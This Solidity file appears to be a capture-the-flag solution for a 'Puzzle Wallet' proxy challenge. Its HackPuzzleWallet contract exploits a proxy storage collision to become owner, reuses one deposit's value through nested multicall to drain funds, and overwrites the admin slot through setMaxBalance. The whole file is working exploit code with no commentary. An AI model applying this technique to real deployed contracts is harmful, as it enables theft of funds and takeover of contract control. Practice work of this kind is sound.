// SPDX-License-Identifier: MIT

pragma solidity 0.8.19;

interface PuzzleProxy {
  function pendingAdmin() external view returns (address);
  function admin() external view returns (address);

  function proposeNewAdmin(address _newAdmin) external;
  function approveNewAdmin(address _expectedAdmin) external;
  function upgradeTo(address _newImplementation) external;

  fallback() external payable;
  receive() external payable;
}

interface PuzzleWallet {
    function owner() external view returns (address);
    function maxBalance() external view returns (uint256);

    function init(uint256 _maxBalance) external;
    function setMaxBalance(uint256 _maxBalance) external;
    function addToWhitelist(address addr) external;
    function deposit() external payable;
    function execute(address to, uint256 value, bytes calldata data) external payable;
    function multicall(bytes[] calldata data) external payable;
}

contract HackPuzzleWallet {
  PuzzleProxy walletProxy;

  constructor(PuzzleProxy _walletProxy) {
    walletProxy = _walletProxy;
  }

  function hack() external payable {
    PuzzleWallet walletImpl = PuzzleWallet(address(walletProxy));

    walletProxy.proposeNewAdmin(address(this));
    walletImpl.addToWhitelist(address(this));

    bytes[] memory data = new bytes[](3);
    bytes[] memory subdata = new bytes[](1);

    data[0] = abi.encodeWithSignature('deposit()');
    subdata[0] = abi.encodeWithSignature('deposit()');
    data[1] = abi.encodeWithSignature('multicall(bytes[])', subdata);
    data[2] = abi.encodeWithSignature('execute(address,uint256,bytes)', msg.sender, 0.002 ether, '');

    walletImpl.multicall{value: msg.value}(data);
    walletImpl.setMaxBalance(uint256(uint160(address(msg.sender))));
  }
}